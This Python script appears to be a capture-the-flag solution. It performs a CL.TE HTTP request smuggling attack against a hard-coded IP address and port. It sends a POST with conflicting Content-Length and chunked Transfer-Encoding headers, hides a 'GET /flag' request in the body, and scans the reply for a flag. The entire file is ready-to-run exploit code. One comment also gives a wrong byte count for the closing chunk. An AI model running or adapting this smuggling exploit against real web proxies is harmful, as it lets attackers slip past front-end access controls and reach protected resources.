#!/usr/bin/env python3
"""
Final exploit - HTTP Request Smuggling with chunked encoding
Key insight: Content-Length larger than chunked body causes remaining bytes to become next request
"""

import socket
import time

HOST = "210.79.190.102"
PORT = 8081

def exploit():
    """
    CL.TE attack: Content-Length is larger than chunked body
    Proxy reads Content-Length bytes, but chunked body ends early
    Remaining bytes become the next request!
    """
    
    print("[*] Attempting CL.TE request smuggling...")
    print("[*] Strategy: Content-Length > chunked body size")
    print("[*] Proxy reads Content-Length bytes, upstream parses chunked")
    print("[*] Remaining bytes after chunked body become next request")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(20)
    
    try:
        sock.connect((HOST, PORT))
        
        # Chunked body: "0\r\n\r\n" (4 bytes - empty chunk, ends request)
        # Content-Length: 100 (much larger)
        # Proxy reads 100 bytes: "0\r\n\r\n" + 96 more bytes
        # Upstream parses chunked: reads "0\r\n\r\n" (4 bytes, request ends)
        # Remaining 96 bytes stay in buffer = next request!
        
        # Smuggle GET /flag request
        smuggled_request = b"GET /flag HTTP/1.1\r\nHost: localhost\r\n\r\n"
        
        # Total body: chunked end (4 bytes) + smuggled request
        chunked_end = b"0\r\n\r\n"
        total_body = chunked_end + smuggled_request
        content_length = len(total_body) + 10  # Make it larger
        
        request = f"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {content_length}\r
Transfer-Encoding: chunked\r
Connection: close\r
\r
""".encode() + total_body + b"X" * 10  # Padding to match Content-Length
        
        print(f"[*] Sending request:")
        print(f"    Content-Length: {content_length}")
        print(f"    Chunked body: {chunked_end}")
        print(f"    Smuggled request: {smuggled_request.decode()}")
        print(f"    Total request size: {len(request)} bytes")
        
        sock.send(request)
        
        print("[*] Waiting for response...")
        time.sleep(2)
        
        response = b""
        try:
            sock.settimeout(10)
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if len(response) > 100000:
                    break
        except socket.timeout:
            print("[*] Timeout waiting for response")
        except Exception as e:
            print(f"[*] Error reading: {e}")
        
        print(f"[+] Received {len(response)} bytes")
        
        if response:
            resp_str = response.decode('utf-8', errors='ignore')
            print(f"[+] Response preview:\n{resp_str[:3000]}")
            
            # Look for flag in response
            if "BPJS{" in resp_str:
                flag_start = resp_str.find("BPJS{")
                flag_end = resp_str.find("}", flag_start) + 1
                flag = resp_str[flag_start:flag_end]
                print(f"\n{'='*70}")
                print(f"[+] FLAG FOUND: {flag}")
                print(f"{'='*70}")
                return flag
            else:
                print("[*] No flag found in response")
                # Check if we got multiple responses (smuggling worked!)
                if resp_str.count("HTTP/1.1") > 1:
                    print("[!] Multiple HTTP responses detected - smuggling might have worked!")
                    # Try to extract second response
                    parts = resp_str.split("HTTP/1.1")
                    if len(parts) > 1:
                        print(f"[*] Second response: HTTP/1.1{parts[1][:500]}")
        else:
            print("[!] No response received")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

if __name__ == "__main__":
    print("=" * 70)
    print("Final Exploit - Chunked Encoding Request Smuggling")
    print("=" * 70)
    print()
    
    result = exploit()
    
    if result:
        print(f"\n[+] SUCCESS! Flag: {result}")
    else:
        print("\n[-] Exploit didn't work. The vulnerability exists but needs refinement.")
        print("[*] The proxy doesn't handle chunked encoding correctly")
        print("[*] Try different Content-Length values or request formats")



